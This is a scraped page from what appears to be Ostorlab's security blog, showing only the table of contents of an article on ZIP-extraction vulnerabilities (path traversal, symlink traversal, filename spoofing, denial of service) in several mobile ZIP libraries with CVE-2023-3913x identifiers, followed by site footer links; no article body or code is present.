* [Anatomy of ZIP file](#anatomy of zip file "Anatomy of ZIP file")
* [Common ZIP vulnerabilities:](#common zip vulnerabilities: "Common ZIP vulnerabilities:")
* [ZIP packages to analyze](#zip packages to analyze "ZIP packages to analyze")
  + [Archive](#archive "Archive")
  + [Flutter\_archive](#flutter_archive "Flutter_archive")
  + [ZIPFoundation](#zipfoundation "ZIPFoundation")
  + [ZIP](#zip "ZIP")
  + [ZIPArchive (SSZIPArchive)](#ziparchive (ssziparchive) "ZIPArchive (SSZIPArchive)")
* [Detected vulnerabilities](#detected vulnerabilities_1 "Detected vulnerabilities")
  + [Package: Archive](#package: archive "Package: Archive")
    - [ZIP filename spoofing (CVE-2023-39137)](#zip filename spoofing (cve-2023-39137) "ZIP filename spoofing (CVE-2023-39137)")
    - [ZIP symlink path traversal (CVE-2023-39139)](#zip symlink path traversal (cve-2023-39139) "ZIP symlink path traversal (CVE-2023-39139)")
  + [Package: ZIPFoundation](#package: zipfoundation_1 "Package: ZIPFoundation")
    - [ZIP symlink path traversal (CVE-2023-39138)](#zip symlink path traversal (cve-2023-39138) "ZIP symlink path traversal (CVE-2023-39138)")
    - [ZIP path traversal (CVE-2023-39138)](#zip path traversal (cve-2023-39138) "ZIP path traversal (CVE-2023-39138)")
  + [Package: Zip](#package: zip_1 "Package: Zip")
    - [ZIP path traversal (CVE-2023-39135)](#zip path traversal (cve-2023-39135) "ZIP path traversal (CVE-2023-39135)")
  + [Package: ZIPArchive (SSZIPArchive)](#package: ziparchive (ssziparchive)_1 "Package: ZIPArchive (SSZIPArchive)")
    - [Denial of Service (CVE-2023-39136)](#denial of service (cve-2023-39136) "Denial of Service (CVE-2023-39136)")
* [Summary table](#summary table_2 "Summary table")
* [Conclusion](#conclusion "Conclusion")

## Subscribe to the Ostorlab Newsletter

A newsletter covering techniques, technical guides, and the latest product innovations coming from Ostorlab.

Subscribe
>

Questions, comments, feedback, or just a quick hello, you know where to reach us 😉!

mdi-at

contact@ostorlab.co

Platform

[Lighthouse](https://ostorlab.co/appcards)

[Vulnerability Database](https://ostorlab.co/vulndb)

[Changelog](https://blog.ostorlab.co/changelog.html)

[FAQ](https://docs.ostorlab.co/faq/)

Product

[Mobile Security Testing](https://ostorlab.co/product/mobile)

[Web Security Testing](https://ostorlab.co/product/web)

[Attack Surface Discovery](https://ostorlab.co/product/attacksurface)

[Open-Source](https://oxo.ostorlab.co/)

Company

[Documentation](https://docs.ostorlab.co)

[Plans](https://ostorlab.co/plans)

[Contact](https://ostorlab.co/contact)

mdi-copyright

`2024 Ostorlab. All Rights
Reserved.`

[`Terms
& Conditions`](https://docs.ostorlab.co/terms/)
[`Privacy
Policy`](https://docs.ostorlab.co/privacy/)

mdi-rss-box

mdi-atom

mdi-github

mdi-linkedin

mdi-instagram

mdi-twitter

mdi-youtube


